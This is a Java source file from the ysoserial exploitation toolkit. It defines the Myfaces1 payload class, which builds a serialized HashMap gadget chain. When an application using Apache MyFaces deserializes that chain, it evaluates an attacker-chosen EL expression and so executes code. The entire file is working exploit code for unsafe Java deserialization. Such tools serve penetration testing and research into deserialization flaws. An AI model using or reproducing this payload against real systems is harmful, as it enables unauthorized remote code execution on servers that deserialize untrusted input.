package ysoserial.payloads;


import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;


/**
 * 
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * 
 * Arguments:
 * - an EL expression to execute
 * 
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 * 
 * @author mbechler
 */
@SuppressWarnings ( {
    "nls", "javadoc"
} )
@PayloadTest(skip="Requires running MyFaces, no direct execution")
public class Myfaces1 implements ObjectPayload<Object> {

    /**
     * {@inheritDoc}
     *
     * @see ysoserial.payloads.ObjectPayload#getObject(java.lang.String)
     */

    public Object getObject ( String command ) throws Exception {
        return makeExpressionPayload(command);
    }


    /**
     * @param expr
     * @return
     * @throws NoSuchFieldException
     * @throws IllegalAccessException
     * @throws Exception
     * @throws ClassNotFoundException
     * @throws NoSuchMethodException
     * @throws InstantiationException
     * @throws InvocationTargetException
     */
    public static Object makeExpressionPayload ( String expr ) throws NoSuchFieldException, IllegalAccessException, Exception, ClassNotFoundException,
            NoSuchMethodException, InstantiationException, InvocationTargetException {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        Field fEl = FacesContextImplBase.class.getDeclaredField("_elContext");
        fEl.setAccessible(true);
        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
        fEl.set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
        ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class); //$NON-NLS-1$
        ValueExpressionMethodExpression e2 = new ValueExpressionMethodExpression(ve2);

        return Gadgets.makeMap(e2, e);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Myfaces1.class, args);
    }
}
